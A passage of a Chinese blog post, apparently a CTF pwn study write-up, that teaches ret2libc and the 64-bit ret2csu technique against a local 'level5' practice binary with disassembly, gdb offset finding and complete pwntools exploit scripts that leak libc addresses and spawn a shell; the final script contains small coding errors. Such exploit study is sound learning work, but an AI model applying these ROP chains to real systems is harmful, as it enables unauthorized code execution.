class="hljs-built_in">hex</span>(puts_addr))<br><br>sys_offset = <span class="hljs-number">0x00048170</span><br>puts_offset = <span class="hljs-number">0x000732a0</span><br>sh_offset = <span class="hljs-number">0x1bd0d5</span><br><br>libc_base_addr = puts_addr - puts_offset<br>sys_addr = libc_base_addr + sys_offset<br>sh_addr = libc_base_addr + sh_offset<br><br>payload2 = <span class="hljs-string">b&#x27;&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;AAAA&#x27;</span> + p32(sh_addr) <br><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>运行后成功getshell</p>
<h2 id="ret2libc-64位，ret2-libc-csu-init"><a href="#ret2libc-64位，ret2-libc-csu-init" class="headerlink" title="ret2libc 64位，ret2__libc_csu_init"></a>ret2libc 64位，ret2__libc_csu_init</h2><p>学习参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/ka1885">https://www.yuque.com/cyberangel/rg9gdm/ka1885</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p>
<p>下面直接用实例学习</p>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)，将程序扔到IDA中，其汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000004005C0<br>.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================<br>.text:00000000004005C0<br>.text:00000000004005C0<br>.text:00000000004005C0 ; void _libc_csu_init(void)<br>.text:00000000004005C0                 public __libc_csu_init<br>.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o<br>.text:00000000004005C0 ; __unwind &#123;<br>.text:00000000004005C0                 push    r15<br>.text:00000000004005C2                 push    r14<br>.text:00000000004005C4                 mov     r15d, edi<br>.text:00000000004005C7                 push    r13<br>.text:00000000004005C9                 push    r12<br>.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry<br>.text:00000000004005D2                 push    rbp<br>.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:00000000004005DA                 push    rbx<br>.text:00000000004005DB                 mov     r14, rsi<br>.text:00000000004005DE                 mov     r13, rdx<br>.text:00000000004005E1                 sub     rbp, r12<br>.text:00000000004005E4                 sub     rsp, 8<br>.text:00000000004005E8                 sar     rbp, 3<br>.text:00000000004005EC                 call    _init_proc<br>.text:00000000004005F1                 test    rbp, rbp<br>.text:00000000004005F4                 jz      short loc_400616<br>.text:00000000004005F6                 xor     ebx, ebx<br>.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]<br>.text:0000000000400600<br>.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400600                 mov     rdx, r13<br>.text:0000000000400603                 mov     rsi, r14<br>.text:0000000000400606                 mov     edi, r15d<br>.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]<br>.text:000000000040060D                 add     rbx, 1<br>.text:0000000000400611                 cmp     rbx, rbp<br>.text:0000000000400614                 jnz     short loc_400600<br>.text:0000000000400616<br>.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j<br>.text:0000000000400616                 add     rsp, 8<br>.text:000000000040061A                 pop     rbx<br>.text:000000000040061B                 pop     rbp<br>.text:000000000040061C                 pop     r12<br>.text:000000000040061E                 pop     r13<br>.text:0000000000400620                 pop     r14<br>.text:0000000000400622                 pop     r15<br>.text:0000000000400624                 retn<br>.text:0000000000400624 ; &#125; // starts at 4005C0<br>.text:0000000000400624 __libc_csu_init endp<br>.text:0000000000400624<br>.text:0000000000400624 ; ---------------------------------------------------------------------------<br></code></pre></td></tr></table></figure>

<p>这里我们可以利用以下几点：从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据（因为都是向寄存器进行pop）。对应的汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040061A                 pop     rbx<br>.text:000000000040061B                 pop     rbp<br>.text:000000000040061C                 pop     r12<br>.text:000000000040061E                 pop     r13<br>.text:0000000000400620                 pop     r14<br>.text:0000000000400622                 pop     r15<br>.text:0000000000400624                 retn<br>.text:0000000000400624 ; &#125; // starts at 4005C0<br>.text:0000000000400624 __libc_csu_init endp<br>.text:0000000000400624<br>.text:0000000000400624 ; ---------------------------------------------------------------------------<br></code></pre></td></tr></table></figure>

<p>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx,将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0。所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器（rdx、rsi、edi）。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。对应的汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000400600<br>.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400600                 mov     rdx, r13<br>.text:0000000000400603                 mov     rsi, r14<br>.text:0000000000400606                 mov     edi, r15d<br>.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]<br></code></pre></td></tr></table></figure>

<p>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为rbx+1 &#x3D; rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx&#x3D;0，rbp&#x3D;1。对应的汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040060D                 add     rbx, 1<br>.text:0000000000400611                 cmp     rbx, rbp<br>.text:0000000000400614                 jnz     short loc_400600<br></code></pre></td></tr></table></figure>



<p>开始做题</p>
<p>首先，查一下保护，开启了NX保护，64位</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure>

<p>运行以下</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">❯ ./level5<br><span class="hljs-built_in">Hello,</span> World<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>

<p>看一下源码，<code>main</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">0xDu</span>LL);<br>  vulnerable_function(<span class="hljs-number">1LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>vulnerable_function</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200u</span>LL);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>发现<code>read</code>函数，并有溢出</p>
<p>用<code>cyclic</code>生成字符串，然后用GDB动调，然后用rsp来找偏移，命令是<code>x/wx $rsp</code>不要理解错了，rsp中没有储存返回地址，而是储存存放返回地址的内存的地址，而这个命令是打印<code>rsp</code>指向的内存的内容</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/wx $<span class="hljs-built_in">rsp</span><br><span class="hljs-number">0x7fffffffdeb8</span>:	<span class="hljs-number">0x6261616a</span><br>❯ cyclic -l <span class="hljs-number">0x6261616a</span><br><span class="hljs-number">136</span><br></code></pre></td></tr></table></figure>

<p>栈偏移为136</p>
<p>从IDA里可以看到，没有system函数，但有一个已知的write函数，我们可以利用这个函数并利用libc泄露出程序加载到内存后的地址（当然也可以选用__libc_start_main）。</p>
<hr>
<p>补充：</p>
<p><code>__libc_start_main</code>是Linux程序中glibc库提供的一个非常重要的函数，它在程序的启动过程中扮演着核心角色。这个函数负责完成程序启动前的一系列初始化工作，并最终调用用户的   main   函数。所以，它也在程序依赖的libc库中，注意，它和<code>main</code>函数不同。</p>
<hr>
<p>下面时第一部分exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./level&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./level&#x27;</span>)<br><br>pop_addr = <span class="hljs-number">0x40061A</span><br>write_got = e.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>mov_addr = <span class="hljs-number">0x400600</span><br>main_addr = e.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Hello World\n&#x27;</span>)<br>payload0 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">136</span> + p64(pop_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(write_got) + p64(<span class="hljs-number">8</span>) + p64(write_got) + p64(<span class="hljs-number">1</span>) + p64(mov_addr) + <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">6</span>) + p64(main_addr)<br>p.sendline(payload0)<br><br>write_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_addr ==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(write_addr))<br></code></pre></td></tr></table></figure>

<p>这里重点解释一下<code>payload0</code>：</p>
<ul>
<li><p>**b’A’*136：**填充垃圾数据，造成栈溢出</p>
</li>
<li><p>然后让pop_addr覆盖栈中的返回地址，使程序执行pop_addr地址处的函数，并分别将栈中的0、1、write_got函数地址、8、write_got、1分别pop到寄存器rbx、rbp、r12、r13、r14、r15中去。之后将pop函数的返回地址覆盖mov_addr的地址为，如下：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>A                 <span class="hljs-keyword">pop</span>     rbx  //rbx-&gt;<span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>B                 <span class="hljs-keyword">pop</span>     rbp  //rbp-&gt;<span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>C                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r12</span>  //<span class="hljs-built_in">r12</span>-&gt;write_got函数地址<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>E                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r13</span>  //<span class="hljs-built_in">r13</span>-&gt;<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400620</span>                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r14</span>  //<span class="hljs-built_in">r14</span>-&gt;write_got函数地址<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400622</span>                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r15</span>  //<span class="hljs-built_in">r15</span>-&gt;<span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span>                 retn         //覆盖为mov_addr<br></code></pre></td></tr></table></figure>

<p>解释一下payload0中两个write_got函数的作用：再布置完寄存器后，由于有 call qword ptr [r12+rbx*8]它调用了write函数，其参数为write_got函数地址（r14寄存器，动调一下就知道了），写成C语言类似于：write(write_got函数地址)&#x3D;&#x3D;printf（write_got函数地址），再使用u64(p.recv(8))接受数据并print出来就行了</p>
</li>
<li><p>之后程序转向mov_addr函数，利用mov指令布置寄存器rdx，rsi，edi</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400600</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r13</span>  //<span class="hljs-built_in">rdx</span>==<span class="hljs-built_in">r13</span>==<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400603</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r14</span>  //<span class="hljs-built_in">rsi</span>==<span class="hljs-built_in">r14</span>==write_got函数地址<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400606</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">r15d</span> //<span class="hljs-built_in">edi</span>==<span class="hljs-built_in">r15d</span>==<span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400609</span>                 <span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rbx</span>*<span class="hljs-number">8</span>] //<span class="hljs-keyword">call</span> write_got函数地址 <br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400611</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbp</span> //<span class="hljs-built_in">rbx</span>==<span class="hljs-number">1</span>,<span class="hljs-built_in">rbp</span>==<span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400614</span>                 <span class="hljs-keyword">jnz</span>     short loc_400600<br></code></pre></td></tr></table></figure>

<p>JNZ(或JNE)(jump if not zero, or not equal)，汇编语言中的条件转移指令。结果不为零(或不相等)则转移<br>这里rbx和rbp都等于1，他们相等，所以程序不会执行<code>400603</code>处的命令，但是这些命令的下一条就是<code>pop_addr</code>的命令，但是我们并不希望它执行到这个函数（因为他会再次pop寄存器更换我们布置好的内容），所以就有了<code>b&#39;a&#39;*(0x8+8*6)</code>，它的作用就是为了平衡堆栈，所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域，可以被填充）</p>
</li>
</ul>
<p>之后，我们就可以构建完整的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./level&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./level&#x27;</span>)<br><br>pop_addr = <span class="hljs-number">0x40061A</span><br>write_got = e.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>mov_addr = <span class="hljs-number">0x400600</span><br>main_addr = e.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Hello World\n&#x27;</span>)<br>payload0 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">136</span> + p64(pop_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(write_got) + p64(<span class="hljs-number">8</span>) + p64(write_got) + p64(<span class="hljs-number">1</span>) + p64(mov_addr) + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">6</span>) + p64(main_addr)<br>p.sendline(payload0)<br><br>write_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_addr ==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(write_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>sys_addr = libc + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>sh_addr = libc + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system==&gt;&quot;</span>, <span class="hljs-built_in">hex</span>(sys_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sh_addr==&gt;&quot;</span>, <span class="hljs-built_in">hex</span>(sh_addr))<br><br>pop_rdi_ret = <span class="hljs-number">0x400623</span><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">136</span> + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)<br><br>p.send(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%8E%9F%E5%88%9B/" class="print-no-link">#原创</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>基本ROP</div>
      <div>http://example.com/2025/02/12/基本ROP/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年2月12日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
